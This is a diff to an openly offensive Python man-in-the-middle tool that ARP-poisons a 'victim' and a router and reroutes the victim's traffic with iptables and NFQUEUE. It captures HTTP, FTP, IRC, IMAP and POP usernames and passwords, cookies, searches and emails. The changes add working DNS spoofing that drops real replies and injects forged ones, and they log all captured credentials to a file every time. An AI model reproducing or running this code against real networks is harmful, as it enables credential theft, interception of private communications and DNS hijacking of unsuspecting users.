@@ -1,8 +1,6 @@
 #!/usr/bin/python
 
 '''
-ADD A DICTIONARY OF LOGINS AND PASSWORDS AND ON CTRL-C HAVE IT THROW ALL THE USERNAMES, PASSWORDS, AND SERVER TO OUTPUT
-MAKE DNSSPOOF RELIABLE
 ADD wifi-monitor TO IT IF NO -ip OPTION EXISTS
 '''
 
@@ -32,9 +30,8 @@ parser.add_argument("-ip", "--ipaddress", help="Enter IP address of victim and s
 parser.add_argument("-d", "--driftnet", help="Open an xterm window with driftnet.", action="store_true")
 parser.add_argument("-s", "--sslstrip", help="Open an xterm window with sslstrip.", action="store_true")
 parser.add_argument("-v", "--verboseURL", help="Shows all URLs the victim visits but doesn't limit the URL to 150 characters like -u does.", action="store_true")
-parser.add_argument("-dns", "--dnsspoof", help="Spoof DNS responses of a specific domain. Enter domain after this argument. This is a race condition with the router so this option is unreliable")
+parser.add_argument("-dns", "--dnsspoof", help="Spoof DNS responses of a specific domain. Enter domain after this argument.")
 parser.add_argument("-p", "--post", help="Print unsecured HTTP POST loads, IMAP/POP/FTP/IRC/HTTP usernames/passwords and incoming/outgoing emails. Will also decode base64 encrypted POP/IMAP passwords for you.", action="store_true")
-parser.add_argument("-w", "--write", help="Write to logfile intercept.log.txt in the current directory", action="store_true")
 parser.add_argument("-i", "--interface", help="Choose the interface to use. Default is the first one that shows up in `ip route`.")
 args = parser.parse_args()
 
@@ -49,8 +46,7 @@ C  = '\033[36m' # cyan
 GR = '\033[37m' # gray
 T  = '\033[93m' # tan
 
-if args.write:
-	logger = open('intercept.log.txt', 'w+')
+logger = open('intercept.log.txt', 'w+')
 
 class Spoof():
 	def originalMAC(self, ip):
@@ -78,10 +74,10 @@ class Parser():
 	oldHTTPack = ''
 	oldHTTPload = ''
 	HTTPfragged = 0
+	mail_passwds = []
 	oldmailack = ''
 	oldmailload = ''
 	mailfragged = 0
-	sentMsgs = []
 
 	def start(self, payload):
 		try:
@@ -90,26 +86,50 @@ class Parser():
 		except:
 			return
 
-		if pkt.haslayer(Raw) and pkt.haslayer(TCP):
-			dport = pkt[TCP].dport
-			sport = pkt[TCP].sport
-			ack = pkt[TCP].ack
-			IP_dst = pkt[IP].dst
-			IP_src = pkt[IP].src
-			# Can't use repr if we're gzip deflating which will be necessary when code injection is added
-			load = repr(pkt[Raw].load)[1:-1]
-			mail_ports = [25, 26, 110, 143]
-			# Catch fragmented packets only if they're being sent from the victim to a web server
-			if dport in mail_ports or sport in mail_ports:
-				self.mailspy(load, dport, sport, IP_dst, IP_src, mail_ports, ack)
-			if dport == 6667 or sport == 6667:
-				self.irc(load, dport, sport, IP_src)
-			if dport == 21 or sport == 21:
-				self.ftp(load, IP_dst, IP_src)
-			if dport == 80 or sport == 80:
-				self.URL(load, ack, dport, sport, pkt)
+		IP_layer = pkt[IP]
+		IP_dst = pkt[IP].dst
+		IP_src = pkt[IP].src
+		if args.urlspy or args.post:
+			if pkt.haslayer(Raw):
+				if pkt.haslayer(TCP):
+					dport = pkt[TCP].dport
+					sport = pkt[TCP].sport
+					ack = pkt[TCP].ack
+					# Can't use repr if we're gzip deflating which will be necessary when code injection is added
+					load = repr(pkt[Raw].load)[1:-1]
+					mail_ports = [25, 26, 110, 143]
+					if dport in mail_ports or sport in mail_ports:
+						self.mailspy(load, dport, sport, IP_dst, IP_src, mail_ports, ack)
+					if dport == 6667 or sport == 6667:
+						self.irc(load, dport, sport, IP_src)
+					if dport == 21 or sport == 21:
+						self.ftp(load, IP_dst, IP_src)
+					if dport == 80 or sport == 80:
+						self.URL(load, ack, dport, sport)
+		if args.dnsspoof or args.dnsspoofall:
+			if pkt.haslayer(DNSQR):
+				dport = pkt[UDP].dport
+				sport = pkt[UDP].sport
+				localIP = [x[4] for x in scapy.all.conf.route.routes if x[2] != '0.0.0.0'][0]
+				if dport == 53 or sport == 53:
+					dns_layer = pkt[DNS]
+					self.dnsspoof(dns_layer, IP_src, IP_dst, sport, dport, localIP, payload)
 
-	def URL(self, load, ack, dport, sport, pkt):
+	# Spoof DNS for a specific domain to point to your machine
+	def dnsspoof(self, dns_layer, IP_src, IP_dst, sport, dport, localIP, payload):
+		if args.dnsspoof:
+			if args.dnsspoof in dns_layer.qd.qname:
+				print G+'[+] DNS request for '+W+args.dnsspoof+G+' found; dropping packet and injecting spoofed one to '+W+localIP
+				logger.write('[+] DNS request for '+args.dnsspoof+' found; dropping packet and injecting spoofed one to '+localIP+'\n')
+				payload.set_verdict(nfqueue.NF_DROP)
+				print G+'[+] Dropped real DNS response. Injecting the spoofed packet sending victim to '+W+localIP
+				logger.write('[+] Dropped real DNS response. Injecting the spoofed packet sending victim to '+localIP+'\n')
+				p = IP(dst=IP_src, src=IP_dst)/UDP(dport=sport, sport=dport)/DNS(id=dns_layer.id, qr=1, aa=1, qd=dns_layer.qd, an=DNSRR(rrname=dns_layer.qd.qname, ttl=10, rdata=localIP))
+				send(p)
+				print G+'[!] Sent spoofed packet for '+W+args.dnsspoof
+				logger.write('[!] Sent spoofed packet for '+args.dnsspoof+'\n')
+
+	def URL(self, load, ack, dport, sport):
 
 		host = None
 		get = None
@@ -135,9 +155,11 @@ class Parser():
 
 		# Split the packet between headers and body and grab the URL from the headers
 		# If you see any other login/pw variable names, tell me and I'll add em in here
-		# As it stands now this has a moderately high false positive rate; I figured better to err on the site of more data than less and it's easy to tell what's a real hit vs false positive
+		# As it stands now this has a moderately high false positive rate; I figured better to err on the site of more data than less
+		# email, user, username, name, login, log, loginID
 		user_regex = '([Ee]mail|[Uu]ser|[Uu]sername|[Nn]ame|[Ll]ogin|[Ll]og|[Ll]ogin[Ii][Dd])=([^&|;]*)'
-		pw_regex = '([Pp]assword|[Pp]ass|[Pp]asswd|[Pp]wd|[Pp]assw)=([^&|;]*)'
+		# password, pass, passwd, pwd, psw, passwrd, passw
+		pw_regex = '([Pp]assword|[Pp]ass|[Pp]asswd|[Pp]wd|[Pp][Ss][Ww]|[Pp]asswrd|[Pp]assw)=([^&|;]*)'
 		header_lines = headers.split(r"\r\n")
 		for l in header_lines:
 			searchHost = re.search('[Hh]ost: ', l)
@@ -156,23 +178,27 @@ class Parser():
 		if host and post:
 			url = host+post
 
-		# Catch search terms, print url, print post loads
+		# print urls
 		if url != None:
 			#Print the URL
 			if args.urlspy:
-				d = ['.jpg', '.jpeg', '.gif', '.png', '.css', '.ico', '.js']
+				d = ['.jpg', '.jpeg', '.gif', '.png', '.css', '.ico', '.js', '.svg', '.woff']
 				if any(i in url for i in d):
 					return
 				if len(url) > 146:
 					print '[*] '+url[:145]
+					logger.write('[*] '+url[:145]+'\n')
 				else:
 					print '[*] '+url
+					logger.write('[*] '+url+'\n')
 			if args.verboseURL:
 				print '[*] '+url
+				logger.write('[*] '+url+'\n')
 
 			# Catch search terms
 			# As it stands now this has a moderately high false positive rate mostly due to the very simple ?s= and ?q= vars
 			# I figured better to err on the site of more data than less and it's easy to tell the false positives from the real searches
+			# search, query, search?q, ?s, &q, ?q, search?p, keywords, command
 			searched = re.search('((search|query|search\?q|\?s|&q|\?q|search\?p|keywords|command)=([^&][^&]*))', url)
 			if searched:
 				searched = searched.group(3)
@@ -181,13 +207,13 @@ class Parser():
 				else:
 					searched = searched.replace('+', ' ').replace('%20', ' ').replace('%3F', '?').replace('%27', '\'').replace('%40', '@').replace('%24', '$').replace('%3A', ':').replace('%3D', '=').replace('%22', '\"').replace('%24', '$')
 					print T+'[+] Searched '+W+host+T+': '+searched+W
-					if args.write:
-						logger.write('[+] Searched %s for: ' % host+searched+'\n')
+					logger.write('[+] Searched '+host+ ' for: '+searched+'\n')
 
 			#Print POST load
 			if post:
 				if 'ocsp' in url:
 					print B+'[+] POST: '+W+url
+					logger.write('[+] POST: '+url+'\n')
 				elif body != '':
 					try:
 						urlsplit = url.split('/')
@@ -196,8 +222,10 @@ class Parser():
 						pass
 					if self.HTTPfragged == 1:
 						print B+'[+] Fragmented POST: '+W+url+B+" HTTP POST's combined load: "+body+W
+						logger.write('[+] Fragmented POST: '+url+" HTTP POST's combined load: "+body+'\n')
 					else:
 						print B+'[+] POST: '+W+url+B+' HTTP POST load: '+body+W
+						logger.write('[+] POST: '+url+" HTTP POST's combined load: "+body+'\n')
 					username = re.findall(user_regex, body)
 					password = re.findall(pw_regex, body)
 					self.user_pass(username, password)
@@ -212,16 +240,13 @@ class Parser():
 		load = load.replace(r"\r\n", "")
 		if 'USER ' in load:
 			print R+'[!] FTP '+load+' SERVER: '+IP_dst+W
-			if args.write:
-				logger.write('[!] FTP '+load+' SERVER: '+IP_dst+'\n')
+			logger.write('[!] FTP '+load+' SERVER: '+IP_dst+'\n')
 		if 'PASS ' in load:
 			print R+'[!] FTP '+load+' SERVER: '+IP_dst+W
-			if args.write:
-				logger.write('[!] FTP '+load+' SERVER: '+IP_dst+'\n')
+			logger.write('[!] FTP '+load+' SERVER: '+IP_dst+'\n')
 		if 'authentication failed' in load:
 			print R+'[*] FTP '+load+W
-			if args.write:
-				logger.write('[*] FTP '+load+'\n')
+			logger.write('[*] FTP '+load+'\n')
 
 	def irc(self, load, dport, sport, IP_src):
 			load = load.split(r"\r\n")
@@ -231,28 +256,23 @@ class Parser():
 						self.IRCnick = load[0].split('NICK ')[1]
 						server = load[1].replace('USER user user ', '').replace(' :user', '')
 						print R+'[!] IRC username: '+self.IRCnick+' on '+server+W
-						if args.write:
-							logger.write('[!] IRC username: '+self.IRCnick+' on '+server+'\n')
+						logger.write('[!] IRC username: '+self.IRCnick+' on '+server+'\n')
 					if 'NS IDENTIFY ' in load[0]:
 						ircpass = load[0].split('NS IDENTIFY ')[1]
 						print R+'[!] IRC password: '+ircpass+W
-						if args.write:
-							logger.write('[!] IRC password: '+ircpass+'\n')
+						logger.write('[!] IRC password: '+ircpass+'\n')
 					if 'JOIN ' in load[0]:
 						join = load[0].split('JOIN ')[1]
 						print C+'[+] IRC joined: '+W+join
-						if args.write:
-							logger.write('[+] IRC joined: '+join+'\n')
+						logger.write('[+] IRC joined: '+join+'\n')
 					if 'PART ' in load[0]:
 						part = load[0].split('PART ')[1]
 						print C+'[+] IRC left: '+W+part
-						if args.write:
-							logger.write('[+] IRC left: '+part+'\n')
+						logger.write('[+] IRC left: '+part+'\n')
 					if 'QUIT ' in load[0]:
 						quit = load[0].split('QUIT :')[1]
 						print C+'[+] IRC quit: '+W+quit
-						if args.write:
-							logger.write('[+] IRC quit: '+quit+'\n')
+						logger.write('[+] IRC quit: '+quit+'\n')
 				# Catch messages from the victim to an IRC channel
 				if 'PRIVMSG ' in load[0]:
 					if IP_src == victimIP:
@@ -260,22 +280,20 @@ class Parser():
 						channel = load.split(' :', 1)[0]
 						ircmsg = load.split(' :', 1)[1]
 						if self.IRCnick != '':
-							print C+'[+] IRC '+W+self.IRCnick+C+' to '+W+channel+C+': '+ircmsg+W
-							if args.write:
-								logger.write('[+] IRC '+self.IRCnick+' to '+channel+': '+ircmsg+'\n')
+							print C+'[+] IRC victim '+W+self.IRCnick+C+' to '+W+channel+C+': '+ircmsg+W
+							logger.write('[+] IRC '+self.IRCnick+' to '+channel+': '+ircmsg+'\n')
 						else:
 							print C+'[+] IRC msg to '+W+channel+C+': '+ircmsg+W
-							if args.write:
-								logger.write('[+] IRC msg to '+channel+':'+ircmsg+'\n')
+							logger.write('[+] IRC msg to '+channel+':'+ircmsg+'\n')
 					# Catch messages from others that tag the victim's nick
 					elif self.IRCnick in load[0] and self.IRCnick != '':
-						print 'self.ircnick is in load'
 						sender_nick = load[0].split(':', 1)[1].split('!', 1)[0]
 						try:
 							load = load[0].split('PRIVMSG ')[1].split(' :', 1)
 							channel = load[0]
 							ircmsg = load[1]
 							print C+'[+] IRC '+W+sender_nick+C+' to '+W+channel+C+': '+ircmsg[1:]+W
+							logger.write('[+] IRC '+sender_nick+' to '+channel+': '+ircmsg[1:]+'\n')
 						except:
 							return
 
@@ -289,34 +307,30 @@ class Parser():
 				else:
 					self.Cookies.append(x)
 				print P+'[+] Cookie found for '+W+host+P+' logged in intercept.log.txt'+W
-				if args.write:
-					logger.write('[+] Cookie found for'+host+':'+x.replace('Cookie: ', '')+'\n')
+				logger.write('[+] Cookie found for'+host+':'+x.replace('Cookie: ', '')+'\n')
 
 	def user_pass(self, username, password):
 		if username:
 			for u in username:
 				print R+'[!] Username found: '+u[1]+W
-				if args.write:
-					logger.write('[!] Username: '+u[1]+'\n')
+				logger.write('[!] Username: '+u[1]+'\n')
 		if password:
 			for p in password:
 				if p[1] != '':
 					print R+'[!] Password: '+p[1]+W
-					if args.write:
-						logger.write('[!] Password: '+p[1]+'\n')
+					logger.write('[!] Password: '+p[1]+'\n')
 
 	def mailspy(self, load, dport, sport, IP_dst, IP_src, mail_ports, ack):
-
 		# Catch fragmented mail packets
-		if dport in mail_ports or sport in mail_ports and load != '':
-			if ack == self.oldmailack:
+		if ack == self.oldmailack:
+			if load != r'.\r\n':
 				self.oldmailload = self.oldmailload+load
 				load = self.oldmailload
 				self.mailfragged = 1
-			else:
-				self.oldmailload = load
-				self.oldmailack = ack
-				self.mailfragged = 0
+		else:
+			self.oldmailload = load
+			self.oldmailack = ack
+			self.mailfragged = 0
 
 		try:
 			headers, body = load.split(r"\r\n\r\n", 1)
@@ -337,13 +351,18 @@ class Parser():
 			self.incoming(headers, body, header_lines, email_headers, sport, dport)
 
 	def passwords(self, IP_src, load, dport, IP_dst):
-		# Get rid of all the hex at the beginning of the load
 		load = load.replace(r'\r\n', '')
 		if dport == 143 and IP_src == victimIP and len(load) > 15:
 			if self.IMAPauth == 1 and self.IMAPdest == IP_dst:
+				# Don't double output mail passwords
+				for x in self.mail_passwds:
+					if load in x:
+						self.IMAPauth = 0
+						self.IMAPdest = ''
+						return
 				print R+'[!] IMAP user and pass found: '+load+W
-				if args.write:
-					logger.write('[!] IMAP user and pass found: '+load+'\n')
+				logger.write('[!] IMAP user and pass found: '+load+'\n')
+				self.mail_passwds.append(load)
 				self.decode(load, dport)
 				self.IMAPauth = 0
 				self.IMAPdest = ''
@@ -352,9 +371,15 @@ class Parser():
 				self.IMAPdest = IP_dst
 		if dport == 110 and IP_src == victimIP:
 			if self.POPauth == 1 and self.POPdest == IP_dst and len(load) > 10:
+				# Don't double output mail passwords
+				for x in self.mail_passwds:
+					if load in x:
+						self.POPauth = 0
+						self.POPdest = ''
+						return
 				print R+'[!] POP user and pass found: '+load+W
-				if args.write:
-					logger.write('[!] POP user and pass found: '+load+'\n')
+				logger.write('[!] POP user and pass found: '+load+'\n')
+				self.mail_passwds.append(load)
 				self.decode(load, dport)
 				self.POPauth = 0
 				self.POPdest = ''
@@ -363,39 +388,42 @@ class Parser():
 				self.POPdest = IP_dst
 		if dport == 26:
 			if 'AUTH PLAIN ' in load:
-				print R+'[!] POP authentication found: '+load+W
-				if args.write:
-					logger.write('[!] POP authentication found: '+load+'\n')
+				# Don't double output mail passwords
+				for x in self.mail_passwds:
+					if load in x:
+						self.POPauth = 0
+						self.POPdest = ''
+						return
+				print R+'[!] Mail authentication found: '+load+W
+				logger.write('[!] Mail authentication found: '+load+'\n')
+				self.mail_passwds.append(load)
 				self.decode(load, dport)
 
 	def outgoing(self, headers, body, header_lines, email_headers, IP_src):
 		if 'Message-ID' in headers:
 			for l in header_lines:
-				# Don't double output sent messages
-				if 'Message-ID' in l:
-					if l in self.sentMsgs:
-						return
-					else:
-						self.sentMsgs.append(l)
 				for x in email_headers:
 					if x in l:
 						self.OheadersFound.append(l)
+			# if date, from, to in headers then print the message
 			if len(self.OheadersFound) > 3 and body != '':
-				print O+'[!] OUTGOING MESSAGE'+W
-				if args.write:
-					logger.write('[!] OUTGOING MESSAGE\n')
-				for x in self.OheadersFound:
-					print O+'	',x+W
-					if args.write:
+				if self.mailfragged == 1:
+					print O+'[!] OUTGOING MESSAGE (fragmented)'+W
+					logger.write('[!] OUTGOING MESSAGE (fragmented)\n')
+					for x in self.OheadersFound:
+						print O+'	',x+W
 						logger.write('	'+x+'\n')
-				try:
-					body = body.split(r'\r\n\x')[0]
 					print O+'	Message:',body+W
-				except:
-					print O+'	[!] Could not parse message body'+W
-					pass
-				if args.write:
 					logger.write('	Message:'+body+'\n')
+				else:
+					print O+'[!] OUTGOING MESSAGE'+W
+					logger.write('[!] OUTGOING MESSAGE\n')
+					for x in self.OheadersFound:
+						print O+'	',x+W
+						logger.write('	'+x+'\n')
+					print O+'	Message:',body+W
+					logger.write('	Message:'+body+'\n')
+
 		self.OheadersFound = []
 
 	def incoming(self, headers, body, header_lines, email_headers, sport, dport):
@@ -413,15 +441,21 @@ class Parser():
 				except:
 					return
 			if message != '':
-				print O+'[!] INCOMING MESSAGE'+W
-				if args.write:
-					logger.write('[!] INCOMING MESSAGE\n')
-				for x in self.IheadersFound:
-					print O+'	'+x+W
-					if args.write:
+				if self.mailfragged == 1:
+					print O+'[!] INCOMING MESSAGE (fragmented)'+W
+					logger.write('[!] INCOMING MESSAGE (fragmented)\n')
+					for x in self.IheadersFound:
+						print O+'	'+x+W
 						logger.write('	'+x+'\n')
-				print O+'	Message: '+message+W
-				if args.write:
+					print O+'	Message: '+message+W
+					logger.write('	Message: '+message+'\n')
+				else:
+					print O+'[!] INCOMING MESSAGE'+W
+					logger.write('[!] INCOMING MESSAGE\n')
+					for x in self.IheadersFound:
+						print O+'	'+x+W
+						logger.write('	'+x+'\n')
+					print O+'	Message: '+message+W
 					logger.write('	Message: '+message+'\n')
 		self.IheadersFound = []
 
@@ -442,8 +476,7 @@ class Parser():
 		# Test to see if decode worked
 		if '@' in decoded:
 			print R+'[!] Decoded:'+decoded+W
-			if args.write:
-				logger.write('[!] Decoded:'+decoded+'\n')
+			logger.write('[!] Decoded:'+decoded+'\n')
 
 #Wrap the nfqueue object in an IReadDescriptor and run the process_pending function in a .doRead() of the twisted IReadDescriptor
 class Queued(object):
@@ -466,20 +499,9 @@ class Queued(object):
 
 class Threads():
 
-	def dnsspoof(self, victimIP):
-		while 1:
-			a=sniff(filter='port 53 and host %s' % victimIP, count=1, promisc=1)
-			DNSpkt = a[0]
-			if not DNSpkt.haslayer(DNSQR):
-				continue
-			if args.dnsspoof in DNSpkt.qd.qname:
-				send(mkspoof(DNSpkt))
-				print G + '[+] Spoofed:', DNSpkt.qd.qname + W
-
 	def sslstrip(self, DN):
 		print 'Redirecting traffic to port 10000 and starting sslstrip\n'
 		os.system('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000')
-#		os.system('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000')
 		xterm = ['xterm', '-e', 'sslstrip', '-f', '-w', 'sslstrip.txt']
 		Popen(xterm, stdout=PIPE, stderr=DN)
 
@@ -487,7 +509,7 @@ class Threads():
 		xterm = ['xterm', '-e', 'driftnet', '-i', '%s' % interface]
 		Popen(xterm, stdout=PIPE, stderr=DN)
 
-	def start_threads(self, victimIP, interface, DN):#, victimMAC, routerMAC, routerIP):
+	def start_threads(self, interface, DN):
 
 		#start twisted reactor in thread
 		rt = Thread(target=reactor.run, args=(False,)) #reactor must be started without signal handling since it's not in the main thread
@@ -502,10 +524,6 @@ class Threads():
 			ssl = Thread(target=self.sslstrip, args=(DN,))
 			ssl.daemon = True
 			ssl.start()
-		if args.dnsspoof:
-			dns = Thread(target=self.dnsspoof, args=(victimIP,))
-			dns.daemon = True
-			dns.start()
 
 #Print all the variables
 def print_vars(interface, DHCPsrvr, dnsIP, local_domain, routerIP, victimIP):
@@ -514,7 +532,9 @@ def print_vars(interface, DHCPsrvr, dnsIP, local_domain, routerIP, victimIP):
 	print "[*] DNS server: " + dnsIP
 	print "[*] Local domain: " + local_domain
 	print "[*] Router IP: " + routerIP
-	print "[*] Client IP: " + victimIP
+	print "[*] victim IP: " + victimIP
+	logger.write("[*] Router IP: " + routerIP+'\n')
+	logger.write("[*] victim IP: " + victimIP+'\n')
 
 #Enable IP forwarding and flush possibly conflicting iptables rules
 def setup(DN, victimMAC):
@@ -533,38 +553,16 @@ def setup(DN, victimMAC):
 #	os.system('iptables -t nat -A PREROUTING -p tcp -s %s -j NFQUEUE' % victimIP)
 #	os.system('iptables -t nat -A PREROUTING -p tcp -d %s -j NFQUEUE' % victimIP)
 	# Just throw packets that are from and to the victim into the reactor
-	os.system('iptables -A FORWARD -p tcp -s %s -m multiport --dports 21,26,53,80,110,143,6667 -j NFQUEUE' % victimIP)
-	os.system('iptables -A FORWARD -p tcp -d %s -m multiport --dports 21,26,53,80,110,143,6667 -j NFQUEUE' % victimIP)
-	os.system('iptables -A FORWARD -p tcp -s %s -m multiport --sports 21,26,53,80,110,143,6667 -j NFQUEUE' % victimIP)
-	os.system('iptables -A FORWARD -p tcp -d %s -m multiport --sports 21,26,53,80,110,143,6667 -j NFQUEUE' % victimIP)
+	os.system('iptables -A FORWARD -p tcp -s %s -m multiport --dports 21,26,80,110,143,6667 -j NFQUEUE' % victimIP)
+	os.system('iptables -A FORWARD -p tcp -d %s -m multiport --dports 21,26,80,110,143,6667 -j NFQUEUE' % victimIP)
+	os.system('iptables -A FORWARD -p tcp -s %s -m multiport --sports 21,26,80,110,143,6667 -j NFQUEUE' % victimIP)
+	os.system('iptables -A FORWARD -p tcp -d %s -m multiport --sports 21,26,80,110,143,6667 -j NFQUEUE' % victimIP)
+	# To catch DNS packets you gotta do prerouting rather than forward for some reason?
+	os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE')
 	print '[*] Forwarded traffic to the queue'
 
 def main():
-	#For use in URL_cb, mailspy respectively
-	global victimMAC, victimIP
-
-#	Cleans up if Ctrl-C is caught
-	def signal_handler(signal, frame):
-		print 'learing iptables, sending healing packets, and turning off IP forwarding...'
-		if args.write:
-			logger.close()
-		if args.dnsspoof:
-			q.unbind(socket.AF_INET)
-			q.close()
-		ipf = open('/proc/sys/net/ipv4/ip_forward', 'r+')
-		ipf.write('0\n')
-		ipf.close()
-		if not dnsIP == routerIP:
-			Spoof().restore(routerIP, dnsIP, routerMAC, dnsMAC)
-			Spoof().restore(routerIP, dnsIP, routerMAC, dnsMAC)
-		os.system('iptables -F')
-		os.system('iptables -X')
-		os.system('iptables -t nat -F')
-		os.system('iptables -t nat -X')
-		Spoof().restore(routerIP, victimIP, routerMAC, victimMAC)
-		Spoof().restore(routerIP, victimIP, routerMAC, victimMAC)
-		exit(0)
-	signal.signal(signal.SIGINT, signal_handler)
+	global victimIP
 
 	#Check if root
 	if not geteuid()==0:
@@ -630,11 +628,13 @@ def main():
 	try:
 		routerMAC = Spoof().originalMAC(routerIP)
 		print "[*] Router MAC: " + routerMAC
+		logger.write("[*] Router MAC: "+routerMAC+'\n')
 	except:
 		exit("[!] Could not get router MAC address")
 	try:
 		victimMAC = Spoof().originalMAC(victimIP)
 		print "[*] Victim MAC: " + victimMAC
+		logger.write("[*] Victim MAC: "+routerMAC+'\n')
 	except:
 		exit("[!] Could not get victim MAC address")
 	if dnsIP != routerIP:
@@ -649,7 +649,26 @@ def main():
 	setup(DN, victimMAC)
 	Queued()
 	th = Threads()
-	th.start_threads(victimIP, interface, DN)
+	th.start_threads(interface, DN)
+
+	# Cleans up if Ctrl-C is caught
+	def signal_handler(signal, frame):
+		print 'learing iptables, sending healing packets, and turning off IP forwarding...'
+		logger.close()
+		ipf = open('/proc/sys/net/ipv4/ip_forward', 'r+')
+		ipf.write('0\n')
+		ipf.close()
+		if not dnsIP == routerIP:
+			Spoof().restore(routerIP, dnsIP, routerMAC, dnsMAC)
+			Spoof().restore(routerIP, dnsIP, routerMAC, dnsMAC)
+		os.system('iptables -F')
+		os.system('iptables -X')
+		os.system('iptables -t nat -F')
+		os.system('iptables -t nat -X')
+		Spoof().restore(routerIP, victimIP, routerMAC, victimMAC)
+		Spoof().restore(routerIP, victimIP, routerMAC, victimMAC)
+		exit(0)
+	signal.signal(signal.SIGINT, signal_handler)
 
 	while 1:
 		#If DNS server is different from the router then we must spoof ourselves as the DNS server as well as the router
@@ -660,71 +679,3 @@ def main():
 
 if __name__ == "__main__":
 	main()
-
-#	except select.error  as ex:
-#		if ex[0] == 4:
-#			pass
-#		else:
-#			raise
-
-#	Threads().start_threads(victimIP, interface, DN)#, victimMAC, routerMAC, routerIP)
-#	while 1:
-#		try:
-#			#If DNS server is different from the router then we must spoof ourselves as the DNS server as well as the router
-#			if not dnsIP == routerIP:
-#				Spoof().poison(dnsIP, victimIP, dnsMAC, victimMAC)
-#			Spoof().poison(routerIP, victimIP, routerMAC, victimMAC)
-#			time.sleep(1.5)
-#		except KeyboardInterrupt:
-#			print 'learing iptables, sending healing packets, and turning off IP forwarding...'
-#			if args.write:
-#				logger.close()
-#			if args.dnsspoof:
-#				q.unbind(socket.AF_INET)
-#				q.close()
-#			ipf = open('/proc/sys/net/ipv4/ip_forward', 'r+')
-#			ipf.write('0\n')
-#			ipf.close()
-#			if dnsIP != routerIP:
-#				Spoof().restore(routerIP, dnsIP, routerMAC, dnsMAC)
-#				Spoof().restore(routerIP, dnsIP, routerMAC, dnsMAC)
-#			Popen(['iptables', '-F'], stdout=PIPE, stderr=DN)
-#			Popen(['iptables', '-t', 'nat', '-F'], stdout=PIPE, stderr=DN)
-#			Popen(['iptables', '-X'], stdout=PIPE, stderr=DN)
-#			Popen(['iptables', '-t', 'nat', '-X'], stdout=PIPE, stderr=DN)
-#			Spoof().restore(routerIP, victimIP, routerMAC, victimMAC)
-#			Spoof().restore(routerIP, victimIP, routerMAC, victimMAC)
-#			exit(0)
-#	while 1:
-#		continue
-#	reactor.run()
-
-#	while 1:
-#		try:
-#			#If DNS server is different from the router then we must spoof ourselves as the DNS server as well as the router
-#			if not dnsIP == routerIP:
-#				Spoof().poison(dnsIP, victimIP, dnsMAC, victimMAC)
-#			Spoof().poison(routerIP, victimIP, routerMAC, victimMAC)
-#			time.sleep(1.5)
-#		except KeyboardInterrupt:
-#			print 'learing iptables, sending healing packets, and turning off IP forwarding...'
-#			if args.write:
-#				logger.close()
-#			if args.dnsspoof:
-#				q.unbind(socket.AF_INET)
-#				q.close()
-#			ipf = open('/proc/sys/net/ipv4/ip_forward', 'r+')
-#			ipf.write('0\n')
-#			ipf.close()
-#			if dnsIP != routerIP:
-#				Spoof().restore(routerIP, dnsIP, routerMAC, dnsMAC)
-#				Spoof().restore(routerIP, dnsIP, routerMAC, dnsMAC)
-#			Popen(['iptables', '-F'], stdout=PIPE, stderr=DN)
-#			Popen(['iptables', '-t', 'nat', '-F'], stdout=PIPE, stderr=DN)
-#			Popen(['iptables', '-X'], stdout=PIPE, stderr=DN)
-#			Popen(['iptables', '-t', 'nat', '-X'], stdout=PIPE, stderr=DN)
-#			Spoof().restore(routerIP, victimIP, routerMAC, victimMAC)
-#			Spoof().restore(routerIP, victimIP, routerMAC, victimMAC)
-#			exit(0)
-
-
